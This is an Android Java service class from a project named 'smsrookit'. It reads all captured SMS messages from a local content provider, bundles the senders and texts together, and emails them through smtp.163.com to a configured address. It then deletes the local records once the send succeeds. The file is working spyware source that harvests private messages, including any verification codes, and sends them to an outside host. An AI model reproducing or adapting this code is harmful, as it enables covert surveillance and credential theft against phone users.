package com.funny.fortest.smsrookit;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import android.widget.Toast;

import com.funny.fortest.smsrookit.Mail.MailSenderInfo;
import com.funny.fortest.smsrookit.Mail.SimpleMailSender;

import java.util.ArrayList;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions and extra parameters.
 */
public class UploadSMSIntentService extends IntentService {

    public UploadSMSIntentService() {
        super("UploadSMSIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {

        ArrayList all=new ArrayList();
        Uri uri = Uri.parse("content://com.funny.fortest.provider/SMS");

        Cursor cursor = SMSApplication.getContext().getContentResolver().query(uri, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String sender = cursor.getString(cursor
                        .getColumnIndex("sender"));
                String message = cursor.getString(cursor
                        .getColumnIndex("message"));

                Log.d("zhaochengyu", "sender is " + sender);
                Log.d("zhaochengyu", "message is " + message);

                String oneSMS = sender + " #### " + message + "\n";
                all.add(oneSMS);
            }
            cursor.close();
        }
        else{
            Log.e("zhaochengyu", "UploadSMSIntentService onHandleIntent: no cursor");
        }

        if(2 > all.size()){
            Log.d("zhaochengyu", "UploadSMSIntentService onHandleIntent: Nothing to upload");
            return;
        }

        String ALLContent = null;
        for(int i=0;i<all.size();i++) {
            String alEach=(String)all.get(i);
            ALLContent = ALLContent + " %%% " + alEach;
        }
        Log.d("zhaochengyu", "UploadSMSIntentService onHandleIntent: " + ALLContent);
        boolean sendflag = sendMail("test",ALLContent);
        if (!sendflag){
            sendMail("test",ALLContent);
        }
    }

    public boolean sendMail(String Subject,String Content){
        // TODO: 2016/4/1  set mail info
        MailSenderInfo mailInfo = new MailSenderInfo();
        mailInfo.setMailServerHost("smtp.163.com");
        mailInfo.setMailServerPort("25");
        mailInfo.setValidate(true);
        mailInfo.setUserName("xxx@163.com");
        mailInfo.setPassword("xxx");//您的邮箱密码
        mailInfo.setFromAddress("xxx@163.com");
        mailInfo.setToAddress("xxx@163.com");
        mailInfo.setSubject(Subject);
        mailInfo.setContent(Content);
        // TODO: 2016/4/1  send mail
        SimpleMailSender sms = new SimpleMailSender();
        boolean sendflag = false;
        Uri uri = Uri.parse("content://com.funny.fortest.provider/SMS");
        try {
            sendflag = sms.sendTextMail(mailInfo);
        }
        catch (Exception e){
            Log.e("zhaochengyu", "UploadSMSIntentService sendMail: Exception on send mail " + e);
            sendflag = false;
        }

        if (sendflag){
            int num = SMSApplication.getContext().getContentResolver().delete(uri,null,null);
            Log.d("zhaochengyu", "UploadSMSIntentService onHandleIntent: "+num+" deleted");
            return true;
        }
        else{
            Log.e("zhaochengyu", "UploadSMSIntentService sendMail: send mail fail");
            return false;
        }
    }
}
